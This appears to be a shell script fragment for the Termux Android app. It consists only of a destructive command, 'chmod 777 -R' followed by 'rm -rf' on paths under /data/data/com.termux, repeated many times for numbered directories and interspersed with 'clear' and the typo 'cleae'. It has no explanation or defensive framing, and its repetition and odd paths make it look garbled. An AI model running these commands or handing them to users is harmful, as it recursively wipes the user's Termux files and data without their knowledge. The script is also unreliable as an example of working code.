	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
